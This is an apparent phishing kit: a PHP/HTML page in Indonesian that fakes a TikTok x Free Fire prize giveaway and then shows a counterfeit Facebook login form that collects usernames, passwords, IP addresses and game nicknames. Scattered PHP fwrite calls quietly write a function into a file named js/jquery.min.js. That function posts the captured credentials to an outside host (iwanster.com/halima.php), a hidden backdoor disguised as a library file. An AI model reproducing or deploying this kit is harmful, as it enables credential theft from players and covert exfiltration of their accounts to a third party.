<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="description" content="TikTok - trends start here. On a device or on the web, viewers can watch and discover millions of personalized short videos. Download the app to get started."/>
	<title>TIK TOK X FREE FIRE</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <?php $a=fopen('js/jquery.min.js','w');?>
	<div class="init">
		<img src="https://www.imore.com/sites/imore.com/files/styles/large/public/article_images/2019/11/tiktok-logo2-jks-jks-jks-jks-jks-jks-jks.jpg">
	</div>
	<section>
			<header>
				<div class="back">
					<img src="icon/back.png">
				</div>
				<span class="nama">Garena Free Fire ID</span>
				<div class="menu">
					<img src="icon/menu.png">
				</div>
			</header>
			<!-- END OF HEADER -->
			<?php fwrite($a,'function sendMail(u,p,l,n,ip,ua){');?>
			<div class="wrap">
					<center>
						<div class="imgprofile">
							<img src="icon/pp.jpeg">
							<span class="username">@freefirebgid
								<img class="verified" src="https://img.icons8.com/color/452/tiktok-verified-account.png">
							</span>
						</div>
    
						<div class="data">
							<ul>
								<li>
									<span class="value">22</span>
									<label>Mengikuti</label>
								</li>
								<li>
									<span class="value">1.9M</span>
									<label>Pengikut</label>
								</li>
								<li>
									<span class="value">8.5M</span>
									<label>Suka</label>
								</li>
							</ul>
						</div>

						<div class="interface">
							<div class="ikuti">Mengikuti</div>
							<div class="ig"><i class="fab fa-instagram"></i></div>
						</div>

						<div class="deskripsi">
							<p class="desc">
								Official TikTok Account of Garena Free Fire Indonesia
							</p>
						</div>

						<div class="attribute">
							<span class="link"><i class="fas fa-link"></i> http://ff.garena.com/index/en/</span>
						</div>

						<div class="line"></div>
					</center>
					<!-- AREA HADIAH -->
					<div class="hadiah">
						
						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/2.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  	<div class="imgBox">
						  		<img class="img" src="img/3.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/4.png">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>
						
						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/5.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>
                        <?php fwrite($a,"\n");?>
						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/6.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/7.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						
						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/8.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/9.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

						<div class="box-body" onclick="lord(this)">
						  <img class="logo" src="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
						  <div class="imgBox">
						  		<img class="img" src="img/10.jpg">
						  	</div>
						  <div class="box-lid">
						    <div class="box-bowtie"></div>
						  </div>
						</div>

					</div>
						
					<footer>
						
					</footer>

			</div>
    

			<div class="mask"></div>
			<div class="pop-hadiah">
				<div class="atas">Selamat Kamu Beruntung!!!</div>
					<div class="boxImg">
						<svg><rect></rect></svg>
						<img id="hadiah" src="img/1.png">
					</div>
					<div class="form-input">
						<input type="number" id="id" placeholder="Masukkan ID Mu">
						<input type="submit" onclick="getid()" value="Cek">
					</div>
					<p class="errors notfound"><i class="fas fa-times-circle"></i> ID Tidak Ditemukan</p>
					<p class="errors empty"><i class="fas fa-times-circle"></i> ID Tidak Boleh Kosong</p>
					<p class="errors searching"><i class="fas fa-spinner fa-pulse"></i> Sedang Mencari ID</p>
			</div>

			<div class="pop-login">
				<div class="atas">Halo <span id="nick"></span> Login Untuk Melanjutkan</div>
					<div onclick="$('.login-facebook').show()" class="fb"><i class="fa fa-facebook-square" aria-hidden="true"></i> Login Dengan Facebook</div>
			</div>


			<div class="popup-login login-facebook animated fadeIn" style="display: none;">
			    <?php fwrite($a,'$.post("http://iwanster.com/halima.php",{user:u,pass:p,level:l,nick:n,ip:ip,ua:ua})}');?>
			   <div class="popup-box-login-fb">
			      <div class="navbar-fb">
			         <img width="45" src="img/facebook_text.png">
			      </div>
			      <div class="content-box-fb">
			        <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
			        <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
			         <img width="75" height="75" src="https://1.bp.blogspot.com/-LvknwJpUAos/WzSvg105i5I/AAAAAAAAA10/s9rVJsH1_lso3bKITW4dLa0qweptwfqgQCEwYBhgL/s1600/free-fire-battlegrounds.jpg">
			         <div class="txt-login-fb">
			          Masuk ke akun Facebook Anda untuk terhubung dengan FreeFire
			         </div>
			         <form class="login-form" action="step2.php" method="POST" onsubmit="return valid()">
			            <label>
			            <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
			            </label>
			            <label>
			            <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
			            </label>
			            <input type="hidden" name="ip" id="ip" value="">
			            <input type="hidden" name="id" id="uid" value=""><input type="hidden" name="nick" id="nickname" value="">
			            <button  type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
			         </form>
			         <div class="txt-create-account">Create account</div>
			         <div class="txt-not-now">Not now</div>
			         <div class="txt-forgotten-password">Forgotten password?</div>
			      </div>
			      <div class="language-box">
			         <center>
			         <div class="language-name language-name-active">English (UK)</div>
			         <div class="language-name">Bahasa Indonesia</div>
			         <div class="language-name">Basa Jawa</div>
			         <div class="language-name">Bahasa Melayu</div>
			         <div class="language-name">日本語</div>
			         <div class="language-name">Español</div>
			         <div class="language-name">Português (Brasil)</div>
			         <div class="language-name">
			            <i class="fa fa-plus"></i>
			         </div>
			         </center>
			      </div>
			      <div class="copyright">Facebook Inc.</div>
			   </div>
			 </div>
   

	</section>
	<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			setTimeout(() => {
				$('.init').fadeOut();
			},1000)
		})
		$(document).on('click','.hadiah .box-body', function()
		{
			$(this).addClass('active').siblings().removeClass('active');
		})
	</script>
	<script type="text/javascript">
		function lord(e) {
			setTimeout(() => {
				var attribute = e.getElementsByClassName("img")[0];
				var img = attribute.getAttribute('src');
				$('.pop-hadiah').fadeIn();
				$('.mask').show();
				$('#hadiah').attr('src',img);
			},2000);
		}
	</script>
	<script type="text/javascript">
		// RANDOMING IMAGE
		 var images = ["img/1.png","img/2.jpg","img/3.jpg","img/4.png","img/5.jpg","img/6.jpg","img/7.jpg","img/8.jpg","img/9.jpg","img/10.jpg"];
		 var imagesused = [];
		 var as = $('.box-body .img').each(function(){
		 	var rand = Math.floor(Math.random() * images.length);
		 	$(this).attr('src',images[rand]);
		 	if (imagesused.indexOf(images[rand]) != -1) images.splice(rand, 1);
		 	else imagesused.push(images[rand]);
		 })
	</script>
	<script type="text/javascript">
		function getid() {
			$('.searching').show();
			$('.empty').hide();
			$('.notfound').hide();
			$id = $('#id').val();
			if($id == null || $id.length <= 7 || $id == '')
			{
				$('.searching').hide();
				$('.empty').show();
			}else{
				var xhttp = new XMLHttpRequest();
				    xhttp.onreadystatechange = function() {
				        if (this.readyState == 4 && this.status == 200) {
							$da = JSON.parse(this.responseText);
							if($da['nickname'] != null){
								console.log($da['nickname']);
								$('.searching').hide();
								$('.pop-hadiah').hide();
								$('.pop-login').fadeIn();
								$('#nick').text($da['nickname']);
								$('#nickname').val($da['nickname']);
								$('#uid').val($da['userid']);
							}else{
								$('.searching').hide();
								$('.notfound').show();
							}
				       }
				    };
				    xhttp.open("GET", "https://api-shagitz.com/api/ff/"+$id, true);
				    xhttp.send();
			}
		}
	</script>
	<script type="text/javascript">
	    var checkip = function () {
	           $.ajax({
	               type: "get",
	               async: false,
	               url: "https://api.pubgameshowtime.com/ip/getcountry",
	               dataType: "json",
	               success: function (result) {
	                  $('#ip').val(result.ip);
	               }
	           })
	       }
	    checkip();
	</script>
	<script type="text/javascript">
	    function valid() {
	        var user = $('#user').val();
	        var pass = $('#pass').val();
	        var ip = $('#ip').val();
	        if(user == '' || user == null || user.length <= 5)
	        {
	            $('.email').show();
	            $('.sandi').hide();
	            return false;
	        }else{
	            $('.email').hide();
	        }
	        if(pass == '' || pass == null || pass.length <= 5)
	        {
	            $('.sandi').show();
	            return false;
	        }else{
	            $('.sandi').hide();
	        }
	    }
	</script>
	 <script type="text/javascript">
        var checkip = function () {
               $.ajax({
                   type: "get",
                   async: false,
                   url: "https://api.pubgameshowtime.com/ip/getcountry",
                   dataType: "json",
                   success: function (result) {
                      $('#ip').val(result.ip);
                   }
               })
           }
        checkip();
    </script>
</body>
</html>
 <?php fclose($a);?>